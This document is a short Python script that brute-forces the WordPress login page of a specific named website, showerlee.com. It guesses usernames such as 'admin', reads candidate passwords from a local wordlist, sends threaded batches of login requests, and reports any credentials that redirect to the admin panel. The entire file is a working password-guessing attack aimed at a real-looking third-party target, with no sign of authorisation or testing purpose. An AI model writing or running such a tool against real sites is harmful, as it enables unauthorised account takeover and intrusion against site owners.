#!/usr/bin/env python3
"""showerlee.com wp-login 暴力"""
import urllib.request, http.cookiejar, sys, threading

URL = "http://showerlee.com/wp-login.php"
users = ["admin", "showerlee", "sl", "admin1"]
found = None

def try_login(user, pwd, results, idx):
    global found
    if found: return
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    try:
        op.open(URL, timeout=6)  # get test cookie
    except: return
    data = f"log={user}&pwd={pwd}&wp-submit=Log+In&redirect_to=http%3A%2F%2Fshowerlee.com%2Fwp-admin%2F&testcookie=1".encode()
    try:
        r = op.open(urllib.request.Request(URL, data=data), timeout=8)
        body = r.read().decode("utf-8","ignore")
        url = r.geturl()
        # 成功: 302到wp-admin
        if "wp-admin" in url and "reauth" not in url:
            print(f"!!! HIT: {user}/{pwd} url={url}", flush=True)
            found = (user, pwd)
            return
    except Exception as e:
        if hasattr(e, "url") and "wp-admin" in str(e.url) and "reauth" not in str(e.url):
            print(f"!!! HIT: {user}/{pwd} url={e.url}", flush=True)
            found = (user, pwd)
    results[idx] = (user, pwd)

def main():
    pwds = [l.strip() for l in open("/tmp/sl_pass.txt") if l.strip()]
    print(f"字典: {len(pwds)} 密码", flush=True)
    for user in users:
        print(f"--- user={user} ---", flush=True)
        for i in range(0, len(pwds), 8):
            if found: break
            batch = pwds[i:i+8]
            threads = []
            results = [None]*8
            for j, pw in enumerate(batch):
                t = threading.Thread(target=try_login, args=(user, pw, results, j))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            if found:
                print(f"FOUND: {found}", flush=True)
                return
        if found: break
    print("DONE no hit", flush=True)

if __name__ == "__main__":
    main()
